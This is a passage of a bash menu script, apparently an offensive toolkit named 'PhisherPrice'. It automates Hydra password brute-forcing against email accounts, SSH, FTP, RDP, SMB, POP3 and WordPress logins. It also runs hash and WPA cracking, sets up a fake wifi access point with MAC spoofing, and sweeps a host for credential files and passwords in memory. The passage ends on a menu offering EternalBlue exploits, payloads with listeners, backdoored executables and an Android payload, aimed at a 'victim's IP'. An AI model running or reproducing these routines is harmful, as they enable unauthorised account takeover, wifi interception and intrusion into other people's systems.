elif [ "$x" == "$option2" ]; then                          #Option2
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
                   \e[0m\e[3;39m \e[1;31m
Cracking / Brute Force
\e[3;39m
(1) Auto-Brute (Hydra)
(2) John-The-Ripper
(3) Hash-Identifier
(4) Hashcat
(5) Aircrack-ng (Crack Wifi Pass)
(6) Start sqldict
(7) Wifi Honey Pot Cracker
(8) Just Dump It

CTRL + C To Exit

Press ENTER To Go To Main Menu
'
subf='1'
subg='2'
subh='3'
subi='4'
subj='5'
subk='6'
honeywhy='7'
dumpitall='8'


wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Cracking/Brute$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$subf" ]; then                    #Sub-Option-f
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                       
                   
\e[0m\e[3;39m \e[1;31m
Hydra Brute Force
\e[3;39m
(1) Email Crack (SMTP)
(2) SNMP Brute Force
(3) FTP Brute Force
(4) SSH  Brute Force
(5) SSH  Brute Force (port 22)
(6) POP3 Brute Force
(7) HTTP 401 Brute Force
(8) Windows RDP Brute Force
(9) SMB Brute Force
(10) WP AUTO BRUTE

CTRL + C To Exit

Press ENTER To Go To Main Menu
'
hynull1='1'
hynull2='2'
hynull3='3'
hynull4='4'
hynull5='5'
hynull6='6'
hynull7='7'
hynull8='8'
newoption1='9'
HYDRAWPAUTOBRUTE='10'

echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$hynull1" ]; then                    #hynull-Option-1
clear
echo -e '\e[1;33m
   _____                       __    
  / ___ \____________    ____ |  | __
 / / ._\ \_  __ \__  \ _/ ___\|  |/ /
<  \_____/|  | \// __ \\  \___|    < 
 \_____\  |__|  (____  /\___  >__|_ \
                     \/     \/     \/\e[1;34m
'
echo -e "\e[1;33mSimple Email Cracking Script Using Hydra.\e[0m"
echo -e "\n-------------------------------------------"

echo -n "Choose a SMTP service (Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com): "
read smtp

echo -n "Enter Email Address: "
read email

echo -n "Provide Directory of Wordlist for Passwords: "
read wordlist

echo -n "Enter SMTP Port Number (default is 465): "
read port
port=${port:-465}  # set default port number if no input is provided

echo -e "\n-------------------------------------------"
echo -e "\e[1;34mCracking email password...\e[0m"
echo -e "-------------------------------------------"
output=$(hydra -S -l "$email" -P "$wordlist" -e ns -V -s "$port" "$smtp" smtp 2>&1)

if [[ $? -ne 0 ]]; then
  echo -e "\e[1;31mAn error occurred while running Hydra. Please check your input and try again.\e[0m"
  exit 1
fi

echo -e "\n-------------------------------------------"
echo -e "\e[1;32mHydra output:\e[0m"
echo -e "-------------------------------------------"
echo -e "$output"

read -p "Press enter to continue."

elif [ "$x" == "$hynull2" ]; then                    #hynull-Option-2
clear
echo -e '\e[1;33m
  _________ _______      _____ __________ 
 /   _____/ \      \    /     \\______   \
 \_____  \  /   |   \  /  \ /  \|     ___/
 /        \/    |    \/    Y    \    |    
/_______  /\____|__  /\____|__  /____|    
        \/         \/         \/ Brute Force \e[1;34m
'
echo "Simple SNMP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter the path of the password list:"
read hydrasnmppass
echo "Enter The Host IP Address of SNMP Server:"
read hydraip

echo -e "\n-----------------------------"
echo "Attempting SNMP password cracking..."
echo "-----------------------------"
output=$(hydra -P $hydrasnmppass -v $hydraip snmp 2>&1)

if echo "$output" | grep -q "login:\|password:"; then
  echo -e "\n-------------------------------------------"
  echo "SNMP password cracked successfully!"
  echo -e "-------------------------------------------"
  echo "Cracked password:"
  echo "$output"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "Failed to crack SNMP password."
  echo -e "-------------------------------------------"
fi

read -p "Press enter to continue." 

elif [ "$x" == "$hynull3" ]; then                    #hynull-Option-3
clear
echo -e '\e[1;33m
________________________________ 
\_   _____/\__    ___/\______   \
 |    __)    |    |    |     ___/
 |     \     |    |    |    |    
 \___  /     |____|    |____|    
     \/ Brute Force\e[1;34m
'
echo "FTP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User:"
read hydrauser
echo "Enter Password List Location:"
read hydrapasslist
echo "Enter the IP Address:"
read hydraip

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi

read -p "Press enter to continue."
elif [ "$x" == "$hynull4" ]; then                    #hynull-Option-4
clear
echo -e '\e[1;33m
  _________ _________ ___ ___  
 /   _____//   _____//   |   \ 
 \_____  \ \_____  \/    ~    \
 /        \/        \    Y    /
/_______  /_______  /\___|_  / 
        \/        \/       \/ Brute Force \e[1;34m
'
echo "SSH Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter User List Location:"
read hydrauser2
echo "Enter Password List Location:"
read hydrapasslist2
echo "Enter IP Address:"
read hydraip2

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  password=$(echo "$output" | grep "login:" | awk '{print $NF}')
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo "Password: $password"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi

read -p "Press enter to continue."

elif [ "$x" == "$hynull5" ]; then                    #hynull-Option-5
clear
echo -e "\nFTP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User:"
read hydrauser
echo "Enter Password List Location:"
read hydrapasslist
echo "Enter the IP Address:"
read hydraip

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -t 1 -l $hydrauser -P $hydrapasslist -vV $hydraip ftp 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi

read -p "Press enter to continue."

elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
clear
echo "Hydra WP Auto Brute"
echo "Enter target URL (e.g. target.com):"
read url
echo "Enter path to login page (e.g. /wp-login.php):"
read path
echo "Enter username or path to wordlist:"
read user
echo "Enter password or path to wordlist:"
read pass
echo "Enter a string that appears on a failed login page:"
read bad
echo "Enter POST parameter string (e.g. 'log=^USER^&pwd=^PASS^'):"
read parameter

clear
echo -e "\n-------------------------------------------"
echo "Executing the following command:"
echo "hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass"
echo "Target URL: http://$url/$path"
echo "Username: $user"
echo "Password: $pass"
echo "Failed login string: $bad"
echo "POST parameter string: $parameter"
echo -e "-------------------------------------------"

echo "Running hydra..."
output=$(hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo -e "-------------------------------------------"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi

# Prompt user to continue
read -p "Press enter to continue."

elif [ "$x" == "$hynull6" ]; then                    #hynull-Option-6
clear
echo -e '\e[1;33m
                    ________  
______   ____ ______\_____  \ 
\____ \ /  _ \\____ \ _(__  < 
|  |_> >  <_> )  |_> >       \
|   __/ \____/|   __/______  /
|__|          |__|         \/ Brute Force \e[1;34m
'
echo "POP3 Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User or User List:"
read hydrauser
echo "Enter Password List Location:"
read hydrapasslist
echo "Enter IP Address:"
read hydraip

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -l $hydrauser -P $hydrapasslist -f $hydraip pop3 -V 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo "Password found: $(echo "$output" | grep -oP '(?<=password: )\S+')"
  echo -e "-------------------------------------------"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi

read -p "Press enter to continue."

elif [ "$x" == "$hynull7" ]; then                    #hynull-Option-7
clear
echo -e '\e[1;33m
   _____  _______  ____ 
  /  |  | \   _  \/_   |
 /   |  |_/  /_\  \|   |
/    ^   /\  \_/   \   |
\____   |  \_____  /___|
     |__|        \/ Brute Force \e[1;34m
'
echo "HTTP Basic Authentication Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter User List Location:"
read hydrauser
echo "Enter Password List Location:"
read hydrapasslist
echo "Enter IP Address:"
read hydraip
echo "Enter the 401 Login Realm"
read hyhost

echo -e "\n-------------------------------------------"
echo "Running Hydra..."
output=$(hydra -L $hydrauser -P $hydrapasslist $hydraip http-get /$hyhost 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo -e "-------------------------------------------"
  echo "Password: $(echo "$output" | grep -oP '(?<=login:\s).*$')"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi

read -p "Press enter to continue."

elif [ "$x" == "$hynull8" ]; then                    #hynull-Option-8
clear
echo -e '\e[1;33m
__________________ __________ 
\______   \______ \\______   \
 |       _/|    |  \|     ___/
 |    |   \|    `   \    |    
 |____|_  /_______  /____|    
        \/        \/ Brute Force \e[1;34m
'
echo "RDP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter the username or username list file path:"
read hydrauser8

echo "Enter the password list file path:"
read hydrapasslist8

echo "Enter the target IP address:"
read hydraip8

if [ -f "$hydrauser8" ]; then
  hydrauser8="-M $hydrauser8"
fi

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  password=$(echo "$output" | grep -o "Password:.*" | cut -d' ' -f2-)
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo "Password: $password"
  echo -e "-------------------------------------------"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi
read -p "Press enter to continue."

elif [ "$x" == "$newoption1" ]; then                    #hynull-Option-9
clear
echo -e '\e[1;33m
  _________   _____ __________ 
 /   _____/  /     \\______   \
 \_____  \  /  \ /  \|    |  _/
 /        \/    Y    \    |   \
/_______  /\____|__  /______  /
        \/         \/       \/ Brute Force \e[1;34m
'
echo "SMB Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User or User List:"
read hydrauser
echo "Enter Password List Location:"
read hydrapasslist
echo "Enter the IP Address:"
read hydraip

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -t 1 -V -f -l $hydrauser -P $hydrapasslist $hydraip smb 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "Login Successful!"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "Login Failed"
  echo -e "-------------------------------------------"
fi

read -p "Press enter to continue."

else 

n


fi

elif [ "$x" == "$subg" ]; then                    #jhon
clear

echo -e "\nPassword Cracking Script Using John the Ripper"
echo -e "-------------------------------------------\n"
echo "Enter the path to your wordlist (e.g. /usr/share/john/password.lst): " 
read wordlist
echo "Enter the path to the file to crack (e.g. /usr/john/Documents/unshadowed.txt): " 
read file

if ! [ -f "$wordlist" ]; then
    clear
    echo "Error: The wordlist file doesn't exist or is inaccessible."
    read -p "Press Enter to continue." 
fi

if ! [ -f "$file" ]; then
    clear
    echo "Error: The file to crack doesn't exist or is inaccessible."
    read -p "Press Enter to continue." 
fi

echo -e "\n-------------------------------------------"
echo "Starting cracking process..."
echo -e "-------------------------------------------\n"

read -p "Enter the mode of attack (wordlist, mask, hybrid): " mode
read -p "Enter the number of CPU cores to use (1-8): " cores

john --wordlist="$wordlist" --rules --format=NT --session=john --fork="$cores" --progress="$mode" "$file"

echo -e "\n-------------------------------------------"
echo "Cracking process complete!"
echo -e "-------------------------------------------\n"

read -p "Press Enter to continue." 

elif [ "$x" == "$subh" ]; then                    #Sub-Option-h
clear
echo -e "\nHash Identifier"
echo -e "-------------------------------------------\n"
echo -e '
-------------------------------------------
|           CTRL + C TO QUIT              |
-------------------------------------------
 '
hash-identifier
echo -e '
-------------------------------------------
|               Good Bye                  |
-------------------------------------------
'

read -p "Press Enter to continue." 

elif [ "$x" == "$subi" ]; then                    #Sub-Option-i
clear
echo -e '\e[1;33m
  ___ ___               .__                   __   
 /   |   \_____    _____|  |__   ____ _____ _/  |_ 
/    ~    \__  \  /  ___/  |  \_/ ___\\__  \\   __\
\    Y    // __ \_\___ \|   Y  \  \___ / __ \|  |  
 \___|_  /(____  /____  >___|  /\___  >____  /__|  
       \/      \/     \/     \/     \/     \/      \e[1;34m
'
echo -e "\nHashcat Password Cracking Script"
echo -e "-------------------------------------------\n"

# Prompt user for input
echo "Enter Hash Type (500 = md5crypt): " 
read encmode
echo "Enter Hash Location (e.g. /usr/share/me/example500.hash): " 
read hashtype
echo "Enter Wordlist Location (e.g. /usr/share/wordlists/sqlmap.txt): " 
read wordlist

# Check if the specified files exist
if ! [[ -f $hashtype ]]; then
  echo "Error: Hash file not found."
  read -p "Press Enter to continue." 
fi

if ! [[ -f $wordlist ]]; then
  echo "Error: Wordlist file not found."
  read -p "Press Enter to continue." 
fi

clear
  echo -e "\n-------------------------------------------"
  echo "Attempting to Crack Hash Type."
  echo -e "-------------------------------------------\n"

hashcat -m $encmode $hashtype $wordlist

if [[ $? -eq 0 ]]; then
  echo -e "\n-------------------------------------------"
  echo "Password successfully cracked!"
  echo -e "-------------------------------------------\n"
else
  echo -e "\n-------------------------------------------"
  echo "Password not found in the wordlist."
  echo -e "-------------------------------------------\n"
fi

read -p "Press Enter to continue." 

elif [ "$x" == "$subj" ]; then                    #Sub-Option-j
clear
echo -e '\e[1;33m
   _____  .__                                    __                             
  /  _  \ |__|______   ________________    ____ |  | __           ____    ____  
 /  /_\  \|  \_  __ \_/ ___\_  __ \__  \ _/ ___\|  |/ /  ______  /    \  / ___\ 
/    |    \  ||  | \/\  \___|  | \// __ \\  \___|    <  /_____/ |   |  \/ /_/  >
\____|__  /__||__|    \___  >__|  (____  /\___  >__|_ \         |___|  /\___  / 
        \/                \/           \/     \/     \/              \//_____/  \e[1;34m
'
echo -e "\nAircrack-ng WPA Password Cracking Script"
echo -e "-------------------------------------------\n"

echo "Enter the location of the password list: "
read wifirip
echo "Enter the location of the capture file (.cap): "
read subopi

if ! [[ -f "$wifirip" ]]; then
  echo "Error: Password list file not found."
  read -p "Press Enter to continue."
fi

if ! [[ -f "$subopi" ]]; then
  echo "Error: Capture file not found."
  read -p "Press Enter to continue."
fi

clear
echo -e "\n-------------------------------------------"
echo "Attempting to crack WPA..."
echo -e "-------------------------------------------\n"

aircrack-ng -w "$wifirip" "$subopi"

if [[ $? -eq 0 ]]; then
  echo -e "\n-------------------------------------------"
  echo "Password successfully cracked!"
  echo -e "-------------------------------------------\n"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "Password not found in the password list."
  echo -e "-------------------------------------------\n"
fi
  read -p "Press Enter to continue."

elif [ "$x" == "$subk" ]; then                    #Sub-Option-k
clear
echo -e "\nLaunching SQLdict"
echo -e "-------------------------------------------\n"

echo -e "Launching SQLdict...\n"

sqldict

read -p "Press Enter to continue."

elif [ "$x" == "$honeywhy" ]; then                    #hynull-Option-9
echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
read iface

echo "Putting wireless interface into monitor mode..."
ip link set dev $iface down
macchanger -r $iface
ip link set dev $iface up
airmon-ng start $iface

echo -n "Enter target ESSID: "
read essid
echo -n "Enter target channel: "
read ch

echo "Creating four fake access points with name $essid..."
xterm -hold -e "airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon0" &
pid1=$!
xterm -hold -e "airbase-ng --essid $essid -a bb:bb:bb:bb:bb:bb -c $ch mon0 -W 1" &
pid2=$!
xterm -hold -e "airbase-ng --essid $essid -a cc:cc:cc:cc:cc:cc -c $ch mon0 -W 1 -z 2" &
pid3=$!
xterm -hold -e "airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon0 -W 1 -Z 4" &
pid4=$!

echo -n "Enter a name for the output file: "
read fname
xterm -hold -e "airodump-ng --channel $ch --write $fname mon0" &
pid5=$!

echo "Attempting to crack password using a strong dictionary..."
aircrack-ng -w /path/to/dictionary.txt $fname-01.cap

echo "Cleaning up..."
kill $pid1 $pid2 $pid3 $pid4 $pid5
airmon-ng stop mon0


read

elif [ "$x" == "$dumpitall" ]; then                    #hynull-Option-9
# A modified version of Gary Hooks' work sys_info.sh:
# 	Original Author: Gary Hooks
# 	Web: http://www.twintel.co.uk
# Supporting input from:
#	MYero
#	JGuz
#	SANDFLY SECURITY Linux Compromise Assessment Cmd Cheat Sheet
# Publish Date: 13th May 2020
# Version: 1.2
# Licence: GNU GPL 

current_time=$(date "+%Y.%m.%d-%H.%M.%S")
folderName="${current_time}_Linux_Data_Dump"
mkdir "$folderName"
OutputFileName="${current_time}_Linux_Data_Dump.rtf"
DEL_RUNNING="\b\b\b\b\b\b\b\b"
CLEAR_EOL=$(tput el)

# First Param: System Name
# Second Param: String describing the overall contents of the file
# Example Useage: insertHeader "MaxEdge" "Passwords in clear text" 
function insertHeader()
{
	printf "########################################################################\n" | tee -a $CURRENT_FILE
	printf "###                  Linux Data Dump                                 ###\n" | tee -a $CURRENT_FILE
	printf "###                       $1                             ###\n" | tee -a $CURRENT_FILE
	printf "###                       $2                                   ###\n" | tee -a $CURRENT_FILE
	printf "########################################################################\n\n" | tee -a $CURRENT_FILE
}

# First Param: Subsection title
# Example usage: insertPartition "ARP Tables"
function insertPartition()
{
    printf -- "\n----------------------------$1----------------------------------------\n" | tee -a $CURRENT_FILE
}

# First Param: String with Descriptive Title
# Second Param: String with actual command
# Example Usage: runTest "List of Files in Current Folder" "ls -lah"

function runTest()
{
    NAME_OF_TEST=$1
    COMMAND_TO_RUN=$2
    printf "$1 - Running"
    insertPartition $1
    printf "($2)\n" >> $CURRENT_FILE
    eval $2 >> $CURRENT_FILE
    printf "\n\n" >> $CURRENT_FILE
    printf "$DEL_RUNNING Saved$CLEAR_EOL\n"
}

echo "Project Name: "
read projectName

##++++++++++++++++ System Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/system_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "General_Information"
runTest "Host_Name" "hostname"
runTest "Host_IP" "hostname -I"
runTest "Domain_Name" "domainname"
runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
runTest "Who_Am_I" "whoami"
runTest "Uptime" "uptime"
runTest "System_Name_&_Version" "uname -a"
COMMAND_STRING='lsb_release -a 2>/dev/null | grep -E "Distributor|Description|Release"'
insertPartition "Distributer,_Description,_Release"
printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
eval $COMMAND_STRING >> $CURRENT_FILE
printf "\n\n" >> $CURRENT_FILE
runTest "Logged_In_Users" "who -a"
#Last Logins list length; Full List: last -a; 
runTest "Last_10_Logins" "last -a | head -10"
runTest "Currently_Connected" "w"
runTest "List_User_Accounts" "cat /etc/passwd"
runTest "List_Sudoers_File" "cat /etc/sudoers"
runTest "Available_Shells" "cat /etc/shells | tail -n +2"
runTest "Environment_Variables" "env"


##++++++++++++++++ Memory Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/memory_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Storage_&_Memory_Data"
runTest "Block_&_Storage_Devices" "lsblk -a"
runTest "Find_Mounted_Filesystems" "findmnt -A"
runTest "File_System_&_Partitions" "df -h"
runTest "Ram_Info" "free -m"
runTest "Memory_Info" "cat /proc/meminfo"
runTest "Find_Hiden_Directories" 'find / -type d -name".*"'

##++++++++++++++++ Network Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/network_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Network_Info"
runTest "Host_Name" "hostname"
runTest "Domain_Name" "domainname"
runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
runTest "Interface_Information(IFCONFIG)" "ifconfig -a"
runTest "Interface_Information(IP)" "ip address"
runTest "Routing_Table" "route -n"
runTest "IP_Tables" "iptables -t nat -vnL"
runTest "ARP_Table" "arp -a"
runTest "Net_Stat_(all)" "netstat -a"
runTest "Net_Stat_(Listening)" "netstat -lapn"
runTest "Listening_Ports" "ss -lntu"
runTest "Current_Connections" "ss -s"
runTest "Resolve_Conf" "cat /etc/resolv.conf"
###runTest "Firewall_Rules" "firewall-cmd --list-all"
runTest "UFW_Firewall_Rules_Verbose" "ufw status verbose"
runTest "UFW_Firewall_Rules_Numbered" "ufw status numbered"

##++++++++++++++++ Hardware Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/hardware_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Hardware_Info"
runTest "CPU_Info" "lscpu"
insertPartition "Device_List"
row_count=$(lspci | wc -l)
for (( c=1; c<=${row_count}; c++ ))
do
	lspci| sed  "${c}q;d" | cut -c 9- | tee -a $CURRENT_FILE
done
runTest "PCI_Devices" "lspci"
runTest "PCI_Devices_(Detailed)" "lspci -v"
runTest "USB_Devices" "lsusb"
runTest "USB_Devices_(Detailed)" "lsusb -v"
###runTest "Dmesg_Info" "dmesg"


##++++++++++++++++ Software Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/software_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Software_Info"
insertPartition "Common_Packages"
#checks if packages in the list are installed and tells thier version
packages=("python" "python3" "mysql" "ruby" "perl" "bash" "ssh" "telnet")
#packages can be added above to search more packages
for i in "${packages[@]}"
do
    version=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | wc -l )
    DETAIL="NOT INSTALLED"
	if [ $version == 1 ]
	then    #if the package is installed, show the version
		DETAIL=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | awk '{ printf "VERSION:" $2 "\n" }' )
	fi
	printf "PACKAGE:${i}\t $DETAIL \n" | tee -a $CURRENT_FILE
done
runTest "Loadable_Kernel_Modules" "lsmod"
runTest "Startup_Programs" "ls -lah /etc/init.d/"
runTest "Installed_Programs" "apt list --installed"
runTest "Services_Programs" "service --status-all"
runTest "Systemctl_Programs" "systemctl status --all"

##++++++++++++++++ Process Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/process_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Process Info"
runTest "Top_5_CPU_Processes" "ps auxwwwf | sort -nr -k 3 | head -5"
runTest "Top_5_Mem_Processes" "ps auxwwwf | sort -nr -k 4 | head -5"
runTest "Current_Processes" "ps auxwwwf"
runTest "Directory_of_Running_Processes" "ls -l /proc/*/cwd"
runTest "Executable_of_Running_Processes" "ls -l /proc/*/exe"
runTest "Arguements_of_Running_Processes" "grep -a ^ /proc/*/cmdline"
runTest "Deleted_Binaries_Still_Running" "ls -aIR /proc/*/exe 2>/dev/null | grep deleted"
# Running from tmp and dev need more testing/verification of functionality
runTest "Proccesses Running From tmp" "ls -aIR /proc/*/cwd 2>/dev/null | grep tmp"
runTest "Proccesses Running From dev" "ls -aIR /proc/*/cwd 2>/dev/null | grep dev"
runTest "Cmd_History_Files" "find / -name *.history"
runTest "Cmd_History" "history"

##++++++++++++++++ Password Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/password_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Passwords"

#This search for clear text passwords TAKES A LONG TIME
COMMAND_STRING='grep -rnw "/" -ie "PASSWORD" 2> /dev/null'
insertPartition "Clear_Text_Passwords"
printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
eval $COMMAND_STRING >> $CURRENT_FILE
printf "\n\n" >> $CURRENT_FILE

runTest "More_Clear_Text_Passwords" 'find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;'
runTest "Passwords_In_Memory" 'strings /dev/mem -n10 | grep -i PASS'

##++++++++++++++++ Misc Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/misc_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Misc_Data"
runTest "SUID_Binaries" "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null"
runTest "SGID_Binaries" "find / -perm -2000 -type f -exec ls -la {} 2>/dev/null"
runTest "Binaries_Of_Interest" "find / -uid 0 -perm -4000 -type f 2>/dev/null"
runTest "World_Writable_Files" "find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null"
runTest "World_Writable_Files" "find / -perm -2 -type f 2>/dev/null"
runTest "World_Writable_Files" "find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null"
runTest "Crontab_Jobs" "crontab -l"

## Collect Logs: find /var/log -mtime -$logDate -exec cp {} $tmp/logs/ \; nested folders are huge!!


##++++++++++++++++ Docker Data.rtf+++++++++++++++++++++++
## CURRENT_FILE=$folderName/docker_data.rtf
## touch $CURRENT_FILE
## insertHeader $projectName "Docker_Container_Enumeration"
        
## runTest "" ""     https://docs.docker.com/engine/reference/commandline/container_ls/


##++++++++++++++++ Zip Data and Remove Files +++++++++++++++++++++++
CURRENT_FILE=$folderName/system_data.rtf
DATE=$(date +"%d %B %Y")
TIME=$(date +"%T")
CURRENT_PATH=$(pwd)
printf "\n\n" | tee -a $CURRENT_FILE
printf "Process Completed\n" | tee -a $CURRENT_FILE
printf -- "------------------------------------\n" | tee -a $CURRENT_FILE
printf "End Time: \t $TIME\n" | tee -a $CURRENT_FILE
printf "End Date: \t $DATE\n" | tee -a $CURRENT_FILE
printf "\n\n" | tee -a $CURRENT_FILE

## END ##
FINAL_PATH="$CURRENT_PATH/$folderName.tgz"
printf "Compressing Results into Package\n\n"
tar -czvf $FINAL_PATH $folderName/*
printf "\nCleaning up\n\n"
rm -rf $folderName
printf "Results will be stored here: \t $FINAL_PATH \n\n"



else 

n


fi

elif [ "$x" == "$option3" ]; then                          #Option3
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
                   
\e[0m\e[3;39m \e[1;31m
Auto Xsploit
\e[3;39m
(1) Scanners
(2) Windows 7/2008 x64 ONLY by IP         (ms17_010_eternalblue)
(3) Enable Remote Desktop                 (ms17_010_eternalblue)
(4) Enable Remote Desktop                 (ms17_010_psexec)
(5) Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)
(6) Windows with a link                   (HTA Server)
(7) Windows     --> pwnd.exe (Payload & listener)
(8) Windows     --> pwnd.exe (TCP Payload with shikata_ga_nai encoder)
(9) Windows     --> pwnd.asp (Payload & listener)
(10) Linux      --> pwnd.py  (Payload & listener)
(11) MacOS      --> pwnd.jar (Payload & listener)
(12) MacOS TCP  --> pwnd.macho (Payload & listener)
(13) Javascript --> pwnd.jsp (Payload & listener)
(14) Web        --> pwnd.php (Payload & listener)
(15) MacOS      --> bind.macho (Bind Shell)
(16) Backdoor .exe
(17) Bind .exe With Payload & Encode (using shikata_ga_nai)
(18) Android    --> pwnd.apk (payload & listener) 
CTRL + C To Exit
Press ENTER To Go To Main Menu
'
auto1='1'
auto2='2'
auto3='3'
auto4='4'
auto5='5'
auto6='6'
auto7='7'
auto8='8'
auto9='9'
auto10='10'
auto11='11'
auto12='12'
auto13='13'
auto14='14'
auto15='15'
auto16='16'
auto17='17'
auto18='18'

wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Auto Xsploit$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$auto1" ]; then                    #auto-Option-1
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
service postgresql start
clear
	echo -e "${banner}"
	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
                   
\e[0m\e[3;39m \e[1;31m
Auto Scanners
\e[3;39m
(1) Test Target If They are Vulnerable To (ms17_010)
(2) Determine Named Pipes Over SMB (pipe_auditor)
(3) Discover DCERPC Services (pipe_dcerpc_auditor)
(4) Scans Host & determines If They Support SMB2
(5) Enumerate The Users On The System (smb_enumusers)
(6) Attempt To Login Via SMB (smb_login)
(7) Brute-forces SID Lookups to determine what local users exist the system (SMB_LOOKUPSID)
(8) determine The Version Of The SMB Service That Is Running (smb_version)
CTRL + C To Exit
Press ENTER To Go To Main Menu
'
scub1='1'
scub2='2'
scub3='3'
scub4='4'
scub5='5'
scub6='6'
scub7='7'
scub8='8'

echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Scanners$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$scub1" ]; then                    #scub-Option-1
clear
echo "Victim's IP:"
read r

